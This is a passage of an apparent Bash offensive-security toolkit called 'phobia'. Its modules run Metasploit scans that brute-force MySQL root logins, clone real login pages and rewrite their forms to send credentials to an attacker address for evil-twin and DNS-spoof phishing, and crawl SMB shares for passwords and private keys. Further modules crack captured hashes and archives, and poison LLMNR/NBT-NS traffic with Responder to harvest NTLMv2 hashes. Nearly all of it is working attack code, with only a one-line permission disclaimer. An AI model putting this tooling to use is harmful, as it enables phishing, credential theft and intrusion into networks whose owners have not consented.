                1433) msf_cmds+="use auxiliary/scanner/mssql/mssql_ping; set RHOSTS $target; run; " ;;
                3306) msf_cmds+="use auxiliary/scanner/mysql/mysql_version; set RHOSTS $target; run; use auxiliary/scanner/mysql/mysql_login; set RHOSTS $target; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; set STOP_ON_SUCCESS true; run; " ;;
                3389) msf_cmds+="use auxiliary/scanner/rdp/rdp_scanner; set RHOSTS $target; run; " ;;
                5432) msf_cmds+="use auxiliary/scanner/postgres/postgres_version; set RHOSTS $target; run; " ;;
                5900) msf_cmds+="use auxiliary/scanner/vnc/vnc_none_auth; set RHOSTS $target; run; " ;;
                6379) msf_cmds+="use auxiliary/scanner/redis/redis_server; set RHOSTS $target; run; " ;;
                8080|8000|443) msf_cmds+="use auxiliary/scanner/http/http_version; set RHOSTS $target; set RPORT $p; run; " ;;
                9200) msf_cmds+="use auxiliary/scanner/elasticsearch/indices_enum; set RHOSTS $target; run; " ;;
                27017) msf_cmds+="use auxiliary/scanner/mongodb/mongodb_login; set RHOSTS $target; run; " ;;
            esac
        done
        msf_cmds+="exit"

        echo -e "${CYAN}[*] running msf scanners...${NC}"
        echo "$msf_cmds" | msfconsole -q 2>&1 | tail -60

        echo ""
        echo -e "${CYAN}[*] searching for exploit modules matching services...${NC}"
        for p in $ports; do
            case "$p" in
                21)  echo -e "${YELLOW}[ftp]${NC}"; msfconsole -q -x "search type:exploit platform:linux name:ftp; search type:exploit name:ftp; exit" 2>&1 | grep -E "^[0-9]+  " | head -5 ;;
                22)  echo -e "${YELLOW}[ssh]${NC}"; msfconsole -q -x "search ssh; exit" 2>&1 | grep -E "^[0-9]+  " | head -5 ;;
                80|8080|8000|443) echo -e "${YELLOW}[web]${NC}"; msfconsole -q -x "search http; exit" 2>&1 | grep -E "^[0-9]+  " | head -8 ;;
                445|139) echo -e "${YELLOW}[smb]${NC}"; msfconsole -q -x "search smb; exit" 2>&1 | grep -E "^[0-9]+  " | head -8 ;;
                3306) echo -e "${YELLOW}[mysql]${NC}"; msfconsole -q -x "search mysql; exit" 2>&1 | grep -E "^[0-9]+  " | head -5 ;;
                3389) echo -e "${YELLOW}[rdp]${NC}"; msfconsole -q -x "search rdp; exit" 2>&1 | grep -E "^[0-9]+  " | head -5 ;;
            esac
        done
        echo ""

    else
        echo -e "${YELLOW}[!] msfdb unavailable — using searchsploit fallback${NC}"
        echo ""

        for p in $ports; do
            local svc
            svc=$(grep -A2 "portid=\"$p\"" "$xml" 2>/dev/null | grep -oE 'name="[^"]*"' | head -1 | cut -d'"' -f2)
            [ -z "$svc" ] && continue
            echo -e "${BOLD}${CYAN}── port $p ($svc) ──${NC}"
            searchsploit "$svc" 2>/dev/null | grep -vE "^(---|Exploits|Shellcodes)" | head -6
            echo ""
        done
    fi

    # 6. save report
    local report="$(_sess_dir)/scans/msf_${target}_$(date +%s).txt"
    mkdir -p "$(dirname "$report")"
    {
        echo "=== MSF auto scan: $target ==="
        echo "Date: $(date)"
        echo "Open ports: $ports"
        echo ""
        echo "=== nmap raw ==="
        cat /tmp/phobia_msf_scan.log 2>/dev/null
    } > "$report"
    echo -e "${GREEN}[+] report: $report${NC}"
    echo ""
    menu_footer
    addon_wait
}


# ===============================================================
# N5 — PHISHING PAGE CLONER
# Downloads a real login page, rewrites forms + assets,
# saves to $PAGES_DIR/cloned-<host>/ and makes it pickable.
# ===============================================================

# rewrite every form's action to point at our portal root
_n5_rewrite_forms() {
    local dir="$1"
    local action_target="${2:-http://10.0.0.1/}"
    local html
    while read -r html; do
        # common variations of <form ...>
        sed -i -E \
            "s|(<form[^>]*action=[\"'])[^\"']*([\"'])|\1${action_target}\2|gI" \
            "$html" 2>/dev/null
        # if there's no action attribute at all, add one
        sed -i -E \
            "s|<form([^>]*)>|<form\1 action=\"${action_target}\">|gI" \
            "$html" 2>/dev/null
        # sometimes the form is loaded via ajax — inject a fallback
        grep -qi "</form>" "$html" && \
            sed -i "s|</body>|<script>document.addEventListener('submit',function(e){var f=e.target;if(f.tagName==='FORM'){f.action='${action_target}';}});</script></body>|" "$html" 2>/dev/null
    done < <(find "$dir" -type f \( -name "*.html" -o -name "*.htm" \) 2>/dev/null)
}

# rewrite asset paths so relative URLs still resolve inside the cloned dir
_n5_rewrite_assets() {
    local dir="$1"
    local html
    while read -r html; do
        # make absolute paths (starting with /) into relative ones
        # so they resolve from the clone root
        sed -i -E \
            "s|(src|href)=(['\"])(/[^'\"]+)|\1=\2.\3|gI" \
            "$html" 2>/dev/null
    done < <(find "$dir" -type f \( -name "*.html" -o -name "*.htm" \) 2>/dev/null)
}

# main function: clone + rewrite + register
n5_page_cloner() {
    trap phobia_interrupt INT
    print_banner
    menu_header "P A G E   C L O N E R"

    phb_row "  Clone a real login page as a phishing template." "${DIM}${GREY}"
    phb_row "  Downloads HTML/CSS/JS/images, rewrites forms + assets." "${DIM}${GREY}"
    phb_div
    phb_row "  This clones publicly-accessible pages only." "${YELLOW}"
    phb_row "  Use only against pages you own or have permission to test." "${YELLOW}"
    phb_div
    phb_row "  [0]  Back" "${RED}"
    menu_footer

    read -p "$(echo -e ${YELLOW}'URL to clone (blank=cancel): '${NC})" TARGET_URL
    [ -z "$TARGET_URL" ] && return

    # normalize
    case "$TARGET_URL" in
        http://*|https://*) : ;;
        *) TARGET_URL="https://$TARGET_URL" ;;
    esac

    local host
    host=$(echo "$TARGET_URL" | awk -F[/:] '{print $4}' | sed 's/^www\.//')
    [ -z "$host" ] && { echo -e "${RED}[!] bad URL${NC}"; addon_wait; return; }

    local out="$PAGES_DIR/cloned-$host"
    local stamp; stamp=$(date +%s)
    local tmpout="/tmp/n5_clone_$stamp"

    print_banner
    menu_header "P A G E   C L O N E R   —   R U N N I N G"
    phb_row "  URL:  $TARGET_URL" "${BOLD}${CYAN}"
    phb_row "  Host: $host" "${BOLD}${CYAN}"
    phb_row "  Out:  $out" "${BOLD}${CYAN}"
    phb_div
    phb_row "  [1/4] mirroring page..." "${BOLD}${YELLOW}"
    menu_footer

    # ---- 1. mirror ----
    rm -rf "$tmpout"
    mkdir -p "$tmpout"
    if ! wget -q --show-progress --no-verbose \
        --mirror --page-requisites --adjust-extension \
        --convert-links --no-parent --span-hosts \
        --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        --timeout=20 --tries=2 \
        -P "$tmpout" "$TARGET_URL" 2>&1 | tail -5; then
        echo -e "${RED}[!] wget failed${NC}"
        rm -rf "$tmpout"
        addon_wait
        return
    fi

    local src
    src=$(find "$tmpout" -type d -name "*$host*" -maxdepth 3 2>/dev/null | head -1)
    [ -z "$src" ] && src=$(find "$tmpout" -type f -name "index.html" 2>/dev/null | head -1 | xargs dirname 2>/dev/null)
    [ -z "$src" ] && { echo -e "${RED}[!] no index.html found in mirror${NC}"; rm -rf "$tmpout"; addon_wait; return; }

    echo ""
    echo -e "${CYAN}[*] [2/4] rewriting forms to redirect to 10.0.0.1${NC}"
    _n5_rewrite_forms "$src" "http://10.0.0.1/"

    echo -e "${CYAN}[*] [3/4] rewriting asset paths${NC}"
    _n5_rewrite_assets "$src"

    echo -e "${CYAN}[*] [4/4] saving to pages dir${NC}"
    rm -rf "$out"
    mkdir -p "$out"
    cp -r "$src"/* "$out"/ 2>/dev/null

    # register as pickable
    local main_html="$out/index.html"
    [ ! -f "$main_html" ] && main_html=$(find "$out" -maxdepth 2 -name "*.html" 2>/dev/null | head -1)
    if [ -z "$main_html" ] || [ ! -f "$main_html" ]; then
        echo -e "${RED}[!] clone had no html${NC}"
        rm -rf "$tmpout" "$out"
        addon_wait
        return
    fi

    # move main html to index.html for the picker
    if [ "$main_html" != "$out/index.html" ]; then
        cp "$main_html" "$out/index.html" 2>/dev/null
    fi

    # write a marker file so the picker knows this is a clone
    echo "$host" > "$out/.cloned_from"

    rm -rf "$tmpout"

    print_banner
    menu_header "P A G E   C L O N E R   —   D O N E"
    phb_row "  Saved:     $out" "${BOLD}${GREEN}"
    phb_row "  Main:      index.html" "${BOLD}${GREEN}"
    phb_row "  Files:     $(find "$out" -type f | wc -l)" "${BOLD}${CYAN}"
    phb_row "  Size:      $(du -sh "$out" 2>/dev/null | awk '{print $1}')" "${BOLD}${CYAN}"
    phb_div
    phb_row "  The picker (DNS spoof, evil twin) will now list it." "${BOLD}${YELLOW}"
    phb_row "  It will be shown as: cloned-$host" "${BOLD}${YELLOW}"
    phb_div
    phb_row "  What changed in the clone:" "${BOLD}${CYAN}"
    phb_row "    - form actions rewritten to http://10.0.0.1/" "${DIM}${GREY}"
    phb_row "    - absolute asset paths made relative" "${DIM}${GREY}"
    phb_row "    - JS fallback injected for ajax-submitted forms" "${DIM}${GREY}"
    menu_footer
    addon_wait
}

# quick list of every clone in $PAGES_DIR
n5_list_clones() {
    print_banner
    menu_header "P A G E   C L O N E R   —   C L O N E S"
    local found=0
    while read -r d; do
        [ -z "$d" ] && continue
        [ ! -d "$d" ] && continue
        found=1
        local name; name=$(basename "$d")
        local from; from=$(cat "$d/.cloned_from" 2>/dev/null)
        local sz; sz=$(du -sh "$d" 2>/dev/null | awk '{print $1}')
        phb_row "  $name  ($sz)" "${BOLD}${GREEN}"
        [ -n "$from" ] && phb_row "      from: $from" "${DIM}${GREY}"
    done < <(find "$PAGES_DIR" -maxdepth 1 -type d -name "cloned-*" 2>/dev/null | sort)
    [ $found -eq 0 ] && phb_row "  no clones yet" "${DIM}${GREY}"
    phb_div
    phb_row "  [0]  Back" "${RED}"
    menu_footer
    read -p "ENTER to return: " _
}

# menu wrapper
menu_page_cloner() {
    trap phobia_interrupt INT
    while true; do
        print_banner
        menu_header "P A G E   C L O N E R"
        phb_row "  -- ACTIONS --" "${BOLD}${CYAN}"
        phb_row "  [1]  Clone a page from URL"     "${BOLD}${GREEN}"
        phb_row "  [2]  List existing clones"      "${BOLD}${CYAN}"
        phb_div
        phb_row "  Clones are saved to: $PAGES_DIR" "${DIM}${GREY}"
        phb_row "  The DNS spoof / evil twin pickers will find them" "${DIM}${GREY}"
        phb_div
        phb_row "  [0]  Back" "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" C
        case "$C" in
            1) n5_page_cloner ;;
            2) n5_list_clones ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}


# ===============================================================
# N8 — HASHCAT AUTO-CRACK
# Reads every hash in the vault, detects type, picks mode,
# runs hashcat with rules + wordlists, writes cleartext back.
# ===============================================================

# detect hashcat mode from hash string
_n8_detect_mode() {
    local h="$1"
    # clean prefix like "user:" or "user::"
    h="${h##*:}"

    # WPA / PMKID
    if echo "$h" | grep -qE '^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}:[0-9a-fA-F]+$' || echo "$h" | grep -qE '^WPA\*'; then
        echo "22000"; return
    fi
    # AS-REP roast ($krb5asrep$)
    if echo "$h" | grep -q '^\$krb5asrep\$'; then
        echo "18200"; return
    fi
    # Kerberoast ($krb5tgs$)
    if echo "$h" | grep -q '^\$krb5tgs\$'; then
        echo "13100"; return
    fi
    # NTLMv2 (responder format: user::domain:challenge:hmac:blob)
    if echo "$h" | grep -qE '^[^:]+::[^:]+:[0-9a-fA-F]+:[0-9a-fA-F]+:[0-9a-fA-F]+$'; then
        echo "5600"; return
    fi
    # NTLM (32 hex chars)
    if echo "$h" | grep -qE '^[0-9a-fA-F]{32}$'; then
        echo "1000"; return
    fi
    # MD5 (32 hex chars lowercase only, no uppercase means often md5 not ntlm)
    if echo "$h" | grep -qE '^[0-9a-f]{32}$'; then
        echo "0"; return
    fi
    # SHA1 (40 hex)
    if echo "$h" | grep -qE '^[0-9a-fA-F]{40}$'; then
        echo "100"; return
    fi
    # SHA256 (64 hex)
    if echo "$h" | grep -qE '^[0-9a-fA-F]{64}$'; then
        echo "1400"; return
    fi
    # bcrypt
    if echo "$h" | grep -qE '^\$2[aby]\$'; then
        echo "3200"; return
    fi
    # sha512crypt ($6$)
    if echo "$h" | grep -qE '^\$6\$'; then
        echo "1800"; return
    fi
    # sha256crypt ($5$)
    if echo "$h" | grep -qE '^\$5\$'; then
        echo "7400"; return
    fi
    # MD5crypt ($1$)
    if echo "$h" | grep -qE '^\$1\$'; then
        echo "500"; return
    fi
    # plain MD5 with salt "hash:salt"
    if echo "$h" | grep -qE '^[0-9a-fA-F]{32}:[^:]+$'; then
        echo "10"; return
    fi

    echo "0"
}

# pretty name for a mode
_n8_mode_name() {
    case "$1" in
        0)     echo "MD5" ;;
        10)    echo "MD5 + salt" ;;
        100)   echo "SHA1" ;;
        500)   echo "md5crypt (\$1\$)" ;;
        1000)  echo "NTLM" ;;
        1400)  echo "SHA256" ;;
        1800)  echo "sha512crypt (\$6\$)" ;;
        3200)  echo "bcrypt" ;;
        5600)  echo "NTLMv2 (responder)" ;;
        7400)  echo "sha256crypt (\$5\$)" ;;
        13100) echo "Kerberoast (\$krb5tgs\$)" ;;
        18200) echo "AS-REP roast (\$krb5asrep\$)" ;;
        22000) echo "WPA / PMKID" ;;
        *)     echo "unknown" ;;
    esac
}

# list wordlists we can use
_n8_wordlists() {
    local lists=()
    for w in \
        /usr/share/wordlists/rockyou.txt \
        /usr/share/wordlists/rockyou.txt.gz \
        $WL_ROCKYOU \
        $WL_160M \
        $WL_NUMBERS \
        $WL_TOP10K ; do
        [ -f "$w" ] && lists+=("$w")
    done
    printf '%s\n' "${lists[@]}"
}

# main auto-crack function
n8_auto_crack() {
    trap phobia_interrupt INT

    # collect hashes
    local hashfile="$(_sess_dir)/creds/n8_hashes_$(date +%s).txt"
    mkdir -p "$(dirname "$hashfile")"

    print_banner
    menu_header "H A S H C A T   A U T O   C R A C K"
    phb_row "  Source options:" "${BOLD}${CYAN}"
    phb_row "  [1]  From credential vault (all hashes)" "${BOLD}${GREEN}"
    phb_row "  [2]  From a file (paste path)"           "${BOLD}${GREEN}"
    phb_row "  [0]  Back"                                 "${RED}"
    menu_footer
    read -p "$(echo -e ${YELLOW}'Choice: '${NC})" SRC

    case "$SRC" in
        1)
            if [ ! -f "$VAULT_DB" ]; then
                echo -e "${YELLOW}[!] no vault yet${NC}"; addon_wait; return
            fi
            sqlite3 "$VAULT_DB" "SELECT password FROM creds WHERE length(password)>=16;" 2>/dev/null > "$hashfile"
            ;;
        2)
            read -p "  hash file path: " F
            [ -f "$F" ] && cp "$F" "$hashfile" || { echo -e "${RED}[!] not found${NC}"; addon_wait; return; }
            ;;
        0|"") return ;;
        *) return ;;
    esac

    local total
    total=$(wc -l < "$hashfile" 2>/dev/null)
    if [ "$total" = "0" ] || [ -z "$total" ]; then
        echo -e "${YELLOW}[!] no hashes to crack${NC}"; addon_wait; return
    fi

    echo -e "${GREEN}[+] $total hashes loaded${NC}"
    echo ""

    # group by mode
    declare -A by_mode
    while IFS= read -r h; do
        [ -z "$h" ] && continue
        local m; m=$(_n8_detect_mode "$h")
        by_mode["$m"]+="$h"$'\n'
    done < "$hashfile"

    # pick wordlist
    local -a wls
    while IFS= read -r w; do
        [ -n "$w" ] && wls+=("$w")
    done < <(_n8_wordlists)

    if [ ${#wls[@]} -eq 0 ]; then
        echo -e "${RED}[!] no wordlists found${NC}"; addon_wait; return
    fi

    # summary
    print_banner
    menu_header "H A S H C A T   A U T O   C R A C K"
    phb_row "  hashes loaded: $total" "${BOLD}${CYAN}"
    phb_row "  wordlists:" "${BOLD}${CYAN}"
    for w in "${wls[@]}"; do
        phb_row "    $w" "${DIM}${GREY}"
    done
    phb_div
    phb_row "  detected groups:" "${BOLD}${GREEN}"
    for m in "${!by_mode[@]}"; do
        local cnt; cnt=$(printf '%s' "${by_mode[$m]}" | grep -c .)
        phb_row "    mode $m ($(_n8_mode_name "$m")) — $cnt hashes" "${BOLD}${YELLOW}"
    done
    phb_div
    phb_row "  rules to apply: best64 + d3ad0ne (auto-installed)" "${DIM}${GREY}"
    menu_footer
    echo ""
    read -p "$(echo -e ${YELLOW}'Start cracking? [y/N]: '${NC})" GO
    [ "$GO" != "y" ] && [ "$GO" != "Y" ] && { addon_wait; return; }

    # verify rules exist
    local rules_ok=0
    ls /usr/share/hashcat/rules/best64.rule >/dev/null 2>&1 && rules_ok=1

    # run per mode
    local cracked_file="$(_sess_dir)/creds/n8_cracked_$(date +%s).txt"
    > "$cracked_file"

    for m in "${!by_mode[@]}"; do
        local mh="$(_sess_dir)/creds/n8_mode_${m}_$(date +%s).txt"
        printf '%s' "${by_mode[$m]}" | grep -v '^$' > "$mh"
        local count; count=$(wc -l < "$mh")

        print_banner
        menu_header "H A S H C A T   R U N N I N G"
        phb_row "  mode: $m  ($(_n8_mode_name "$m"))" "${BOLD}${YELLOW}"
        phb_row "  hashes: $count" "${BOLD}${CYAN}"
        phb_row "  running hashcat..." "${DIM}${GREY}"
        menu_footer

        # attack each wordlist
        for w in "${wls[@]}"; do
            local wname; wname=$(basename "$w")

            # base run
            echo -e "${CYAN}[*] wordlist: $wname${NC}"
            hashcat -m "$m" -a 0 "$mh" "$w" \
                --potfile-path="$(_sess_dir)/creds/n8.potfile" \
                --outfile="$cracked_file" \
                --outfile-format=2 \
                --quiet --optimized-kernel-enable 2>&1 | tail -3

            # rules run (if rules available)
            if [ $rules_ok -eq 1 ]; then
                echo -e "${CYAN}[*] wordlist: $wname + best64.rule${NC}"
                hashcat -m "$m" -a 0 "$mh" "$w" \
                    -r /usr/share/hashcat/rules/best64.rule \
                    --potfile-path="$(_sess_dir)/creds/n8.potfile" \
                    --outfile="$cracked_file" \
                    --outfile-format=2 \
                    --quiet --optimized-kernel-enable 2>&1 | tail -3
            fi
        done

        # clean up mode file
        rm -f "$mh"
    done

    # dedupe and write back to vault
    sort -u "$cracked_file" -o "$cracked_file" 2>/dev/null
    local cracked_count; cracked_count=$(wc -l < "$cracked_file" 2>/dev/null)

    print_banner
    menu_header "H A S H C A T   C O M P L E T E"
    phb_row "  hashes submitted: $total" "${BOLD}${CYAN}"
    phb_row "  cracked:          $cracked_count" "$([ "$cracked_count" -gt 0 ] && echo "${BOLD}${GREEN}" || echo "${BOLD}${RED}")"
    phb_row "  output file:      $cracked_file" "${DIM}${GREY}"
    phb_div

    if [ "$cracked_count" -gt 0 ]; then
        phb_row "  -- cracked passwords --" "${BOLD}${GREEN}"
        head -20 "$cracked_file" | while read -r line; do
            [ -z "$line" ] && continue
            phb_row "    $line" "${BOLD}${LIME}"
        done
        phb_div
        phb_row "  adding to vault..." "${DIM}${GREY}"
        while read -r line; do
            [ -z "$line" ] && continue
            _vault_add "hashcat" "cracked" "n8" "$line" "auto-cracked" 2>/dev/null
        done < "$cracked_file"
    fi
    menu_footer
    addon_wait
}

# menu wrapper
menu_hashcat_auto() {
    trap phobia_interrupt INT
    while true; do
        print_banner
        menu_header "H A S H C A T   A U T O"
        phb_row "  Auto-crack hashes with hashcat." "${DIM}${GREY}"
        phb_row "  Detects type, picks mode, runs rules." "${DIM}${GREY}"
        phb_div
        phb_row "  -- ACTIONS --" "${BOLD}${CYAN}"
        phb_row "  [1]  Auto-crack from vault"     "${BOLD}${GREEN}"
        phb_row "  [2]  Auto-crack from file"      "${BOLD}${GREEN}"
        phb_row "  [3]  Show cracked history"      "${BOLD}${CYAN}"
        phb_div
        phb_row "  [0]  Back" "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" C
        case "$C" in
            1) n8_auto_crack ;;
            2) n8_auto_crack ;;
            3)
                print_banner; menu_header "C R A C K E D   H I S T O R Y"
                if [ -f "$VAULT_DB" ]; then
                    sqlite3 -header -column "$VAULT_DB" \
                        "SELECT ts,password,notes FROM creds WHERE source='hashcat' ORDER BY id DESC LIMIT 50;" 2>/dev/null
                else
                    phb_row "  no vault yet" "${DIM}${GREY}"
                fi
                menu_footer
                addon_wait ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}


# ===============================================================
# N3 — SMB SHARE CRAWLER
# Enumerates every SMB share, downloads readable files,
# greps for secrets (passwords, keys, tokens, config).
# ===============================================================

n3_smb_crawler() {
    trap phobia_interrupt INT
    print_banner
    menu_header "S M B   S H A R E   C R A W L E R"

    if ! lan_pick_target "SMB CRAWLER TARGET"; then return; fi
    local target="$LAN_TARGET_IP"

    local lootdir="$(_sess_dir)/loot/smb_$target_$(date +%s)"
    mkdir -p "$lootdir"

    echo -e "${CYAN}[*] Enumerating shares on $target...${NC}"
    smbclient -L "//$target" -N 2>&1 | tee "$lootdir/_shares.txt" | head -30
    echo ""

    local shares
    shares=$(awk '/Disk|IPC/ {print $1}' "$lootdir/_shares.txt" 2>/dev/null | sort -u | grep -v '^$')

    if [ -z "$shares" ]; then
        echo -e "${YELLOW}[!] no shares (or need creds)${NC}"
        read -p "  username: " u
        read -sp "  password: " p; echo ""
        [ -n "$u" ] && {
            smbclient -L "//$target" -U "$u%$p" 2>&1 | tee "$lootdir/_shares.txt" | head -30
            shares=$(awk '/Disk|IPC/ {print $1}' "$lootdir/_shares.txt" 2>/dev/null | sort -u | grep -v '^$')
        }
    fi

    [ -z "$shares" ] && { echo -e "${RED}[!] still no shares${NC}"; addon_wait; return; }

    echo -e "${GREEN}[+] shares: $(echo $shares | tr '\n' ' ')${NC}"
    echo ""

    for share in $shares; do
        [ "$share" = "IPC$" ] && continue
        local outdir="$lootdir/$share"
        mkdir -p "$outdir"
        echo -e "${BOLD}${CYAN}── crawling //$target/$share ──${NC}"

        # recursive download via smbclient
        {
            echo "prompt off"
            echo "recurse on"
            echo "lcd $outdir"
            echo "mget *"
            echo "quit"
        } | timeout 120 smbclient "//$target/$share" -N 2>&1 | tail -5

        echo "  → saved files: $(find "$outdir" -type f 2>/dev/null | wc -l)"
    done

    echo ""
    echo -e "${CYAN}[*] Grepping for secrets in downloaded files...${NC}"

    local secrets_file="$lootdir/_secrets.txt"
    : > "$secrets_file"

    grep -rInE \
        -e 'password[[:space:]]*=' \
        -e 'passwd[[:space:]]*=' \
        -e 'pass[[:space:]]*=' \
        -e 'pwd[[:space:]]*=' \
        -e 'secret[[:space:]]*=' \
        -e 'api[_-]?key' \
        -e 'token[[:space:]]*=' \
        -e 'aws_access' \
        -e 'aws_secret' \
        -e 'BEGIN RSA PRIVATE KEY' \
        -e 'BEGIN OPENSSH PRIVATE KEY' \
        "$lootdir" 2>/dev/null \
        | grep -v "_secrets.txt" \
        | head -100 >> "$secrets_file"

    local n_secrets
    n_secrets=$(wc -l < "$secrets_file" 2>/dev/null)

    print_banner
    menu_header "S M B   C R A W L E R   —   D O N E"
    phb_row "  Target:       $target" "${BOLD}${CYAN}"
    phb_row "  Shares:       $(echo $shares | wc -w)" "${BOLD}${CYAN}"
    phb_row "  Files saved:  $(find "$lootdir" -type f 2>/dev/null | wc -l)" "${BOLD}${GREEN}"
    phb_row "  Secrets hits: $n_secrets" "$([ "$n_secrets" -gt 0 ] && echo "${BOLD}${RED}" || echo "${BOLD}${GREY}")"
    phb_row "  Loot dir:     $lootdir" "${DIM}${GREY}"
    phb_div
    if [ "$n_secrets" -gt 0 ]; then
        phb_row "  -- top secret hits --" "${BOLD}${RED}"
        head -10 "$secrets_file" | while read -r line; do
            phb_row "    $(echo "$line" | cut -c1-100)" "${DIM}${YELLOW}"
        done
    fi
    menu_footer
    addon_wait
}

menu_smb_crawler() {
    trap phobia_interrupt INT
    while true; do
        print_banner
        menu_header "S M B   S H A R E   C R A W L E R"
        phb_row "  Enumerate every readable share, grab files, find secrets." "${DIM}${GREY}"
        phb_div
        phb_row "  [1]  Crawl a target" "${BOLD}${GREEN}"
        phb_row "  [2]  Show previous crawls" "${BOLD}${CYAN}"
        phb_div
        phb_row "  [0]  Back" "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" C
        case "$C" in
            1) n3_smb_crawler ;;
            2) ls -la "$(_sess_dir)/loot/" 2>/dev/null | grep smb_ | tail -20; addon_wait ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}

# ===============================================================
# N9 — ZIP / ARCHIVE CRACKER
# fcrackzip + john (zip2john, rar2john, 7z2john) + hashcat modes
# ===============================================================

n9_crack_archive() {
    trap phobia_interrupt INT
    print_banner
    menu_header "A R C H I V E   C R A C K E R"
    phb_row "  Crack password-protected ZIP / RAR / 7Z files." "${DIM}${GREY}"
    phb_row "  Uses fcrackzip + john + hashcat." "${DIM}${GREY}"
    phb_div
    read -p "$(echo -e ${YELLOW}'Archive path: '${NC})" ARCH
    [ -z "$ARCH" ] && return
    [ ! -f "$ARCH" ] && { echo -e "${RED}[!] not found${NC}"; addon_wait; return; }

    local ext="${ARCH##*.}"
    local wl="/usr/share/wordlists/rockyou.txt"
    local tmp="$(_sess_dir)/creds/archive_$(date +%s)"
    mkdir -p "$(dirname "$tmp")"

    echo ""
    echo -e "${CYAN}[*] Archive: $ARCH  (type: $ext)${NC}"
    echo ""

    case "$ext" in
        zip|ZIP)
            echo -e "${BOLD}${YELLOW}[1/3] fcrackzip (fast)...${NC}"
            fcrackzip -u -D -p "$wl" "$ARCH" 2>&1 | tail -5
            echo ""
            echo -e "${BOLD}${YELLOW}[2/3] zip2john + john...${NC}"
            zip2john "$ARCH" > "$tmp.hash" 2>/dev/null
            if [ -s "$tmp.hash" ]; then
                john --wordlist="$wl" "$tmp.hash" 2>&1 | tail -5
                echo ""
                echo -e "${BOLD}${YELLOW}[3/3] john --show...${NC}"
                john --show "$tmp.hash" 2>&1 | head -5
            fi
            ;;
        rar|RAR)
            command -v rar2john >/dev/null 2>&1 || { echo -e "${YELLOW}[!] rar2john missing${NC}"; addon_wait; return; }
            rar2john "$ARCH" > "$tmp.hash" 2>/dev/null
            john --wordlist="$wl" "$tmp.hash" 2>&1 | tail -10
            john --show "$tmp.hash" 2>&1 | head -5
            ;;
        7z|7Z)
            command -v 7z2john >/dev/null 2>&1 || 7z2john.pl "$ARCH" > "$tmp.hash" 2>/dev/null
            [ -s "$tmp.hash" ] && john --wordlist="$wl" "$tmp.hash" 2>&1 | tail -10
            ;;
        *)
            echo -e "${YELLOW}[!] unknown type, trying fcrackzip anyway${NC}"
            fcrackzip -u -D -p "$wl" "$ARCH" 2>&1 | tail -10
            ;;
    esac

    echo ""
    menu_footer
    addon_wait
}

menu_archive_cracker() {
    trap phobia_interrupt INT
    while true; do
        print_banner
        menu_header "A R C H I V E   C R A C K E R"
        phb_row "  [1]  Crack ZIP/RAR/7Z" "${BOLD}${GREEN}"
        phb_row "  [2]  Crack with custom wordlist" "${BOLD}${CYAN}"
        phb_div
        phb_row "  [0]  Back" "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" C
        case "$C" in
            1|2) n9_crack_archive ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}

# ===============================================================
# N2 — CREDENTIAL HARVESTER
# Responder + optional ntlmrelayx + auto-hashcat on captures
# ===============================================================

n2_cred_harvest() {
    trap phobia_interrupt INT
    print_banner
    menu_header "C R E D   H A R V E S T E R"

    local iface
    iface=$(_wan_iface 2>/dev/null)
    [ -z "$iface" ] && iface="$INTERFACE"

    phb_row "  Interface: $iface" "${BOLD}${CYAN}"
    phb_row "  Method: LLMNR/NBT-NS/MDNS poisoning via Responder" "${DIM}${GREY}"
    phb_row "  Duration: user-defined" "${DIM}${GREY}"
    phb_div
    phb_row "  [1]  Start harvester (background)" "${BOLD}${GREEN}"
    phb_row "  [2]  Stop harvester"                "${BOLD}${RED}"
    phb_row "  [3]  Show captured hashes"          "${BOLD}${CYAN}"
    phb_row "  [4]  Auto-crack captured (N8)"      "${BOLD}${MAGENTA}"
    phb_div
    phb_row "  [0]  Back" "${RED}"
    menu_footer
    read -p "$(echo -e ${YELLOW}'Choice: '${NC})" C

    case "$C" in
        1)
            command -v responder >/dev/null 2>&1 || { echo -e "${RED}[!] responder missing${NC}"; addon_wait; return; }
            echo -e "${CYAN}[*] starting responder on $iface...${NC}"
            sudo nohup responder -I "$iface" -wrv </dev/null >>"$PHOBIA_DEBUG_LOG" 2>&1 &
            echo $! > /tmp/n2_responder.pid
            disown 2>/dev/null
            sleep 3
            if kill -0 "$(cat /tmp/n2_responder.pid)" 2>/dev/null; then
                echo -e "${GREEN}[+] harvester running (pid $(cat /tmp/n2_responder.pid))${NC}"
                echo -e "${DIM}    log: /tmp/n2_responder.log${NC}"
                echo -e "${DIM}    hashes: /usr/share/responder/logs/${NC}"
            else
                echo -e "${RED}[!] failed to start${NC}"
                tail -5 /tmp/n2_responder.log
            fi
            addon_wait ;;
        2)
            [ -f /tmp/n2_responder.pid ] && {
                kill -9 "$(cat /tmp/n2_responder.pid)" 2>/dev/null
                sudo pkill -9 -f "Responder.py" 2>/dev/null
                rm -f /tmp/n2_responder.pid
            }
            echo -e "${GREEN}[+] stopped${NC}"
            addon_wait ;;
        3)
            echo ""
            if [ -d /usr/share/responder/logs ]; then
                ls -lh /usr/share/responder/logs/ 2>/dev/null | tail -20
            else
                echo -e "${DIM}  no logs yet${NC}"
            fi
            echo ""
            addon_wait ;;
        4)
            # collect all NTLMv2 hashes and pass to hashcat (N8 already detects mode 5600)
            local hf="$(_sess_dir)/creds/n2_ntlmv2_$(date +%s).txt"
            mkdir -p "$(dirname "$hf")"
            cat /usr/share/responder/logs/*NTLMv2*.txt 2>/dev/null | \
                awk -F: '{print $NF}' | grep -vE '^$' > "$hf" 2>/dev/null
            local n
            n=$(wc -l < "$hf" 2>/dev/null || echo 0)
            if [ "$n" -gt 0 ]; then
                echo -e "${GREEN}[+] $n NTLMv2 hashes collected → $hf${NC}"
                n8_auto_crack
            else
                echo -e "${YELLOW}[!] no NTLMv2 hashes yet${NC}"
            fi
            addon_wait ;;
        0) return ;;
    esac
}

menu_cred_harvester() {
    trap phobia_interrupt INT
